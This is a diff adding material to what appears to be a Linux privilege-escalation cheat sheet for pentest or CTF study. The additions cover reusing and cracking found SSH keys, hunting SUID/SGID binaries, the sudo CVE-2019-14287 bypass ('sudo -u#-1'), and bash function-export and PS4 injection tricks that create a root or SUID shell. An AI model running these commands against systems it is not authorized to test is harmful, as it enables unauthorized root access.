@@ -57,6 +57,9 @@ Learn more about your environment
 * `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any
 * `ls -ahl /root/`: see if there are readable files in root's home
 * `find / -name *id_dsa* 2> /dev/null`: RSA credentials
+  * You can use `ssh -i key` to connect using a key
+  * The key must have the permissions `u+rw` at least
+  * You can try to crack it
 
 **Logs** 🗺️
 
@@ -67,6 +70,8 @@ Learn more about your environment
 * Look for backups <small>(such as emails/conversations/database)</small>
 * Look for mails `/var/mail/`
 * `~/.bash_history`: there may be something useful in the bash_history
+  * Look for calls to sudo
+  * Look for calls to services (mysql...)
 </div><div>
 
 **Cron tasks** ⭐
@@ -173,11 +178,16 @@ $ cat /etc/shadow
 ```
 </div><div>
 
-Scripts having the SUID bit can be executed with the permissions of their owner. If you find one, try to see on GTFOBins if you have a well-known way to exploit it.
+**SUID/GUID**
+
+Scripts having the SUID bit can be executed with the permissions of their owner. GUID is the same, but using the owner group permissions. If you find one, try to see on GTFOBins if you have a well-known way to exploit it.
 
 ```bash
 $ find / -perm -u=s -type f 2>/dev/null
+$ find / -perm -g=s -type f 2>/dev/null
 ```
+
+If the script "hand-made", or not something on GTFOBins, then you can use `strace script`, and `strings script`. Both commands can be used if the script is "unreadable", to try to find what the script is doing, and maybe find Paths/Environment variables that you may have the permission to edit.
 </div></div>
 
 <hr class="sr">
@@ -196,13 +206,35 @@ $ sudo -l
 # otherwise, 
 # - look for the command on GTFOBins
 # - look for environment variable loaded that may be exploited
+$ sudo -n nc # if nc allowed
 ```
 </div><div>
 
-In sudo before 1.8.28 (CVE-2019-14287), if a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.
+**sudo before 1.8.28 (CVE-2019-14287)**: if a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.
 
 ```bash
 $ sudo -u#-1 nc
 $ sudo -u#4294967295 nc
+```
+</div></div>
+
+<hr class="sl">
+
+## Exploit bash
+
+<div class="row row-cols-md-2"><div>
+
+**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.
+
+```bash
+function /some/path { /bin/bash -p; }
+export -f /some/path
+```
+</div><div>
+
+**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.
+
+```bash
+$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
 ```
 </div></div>
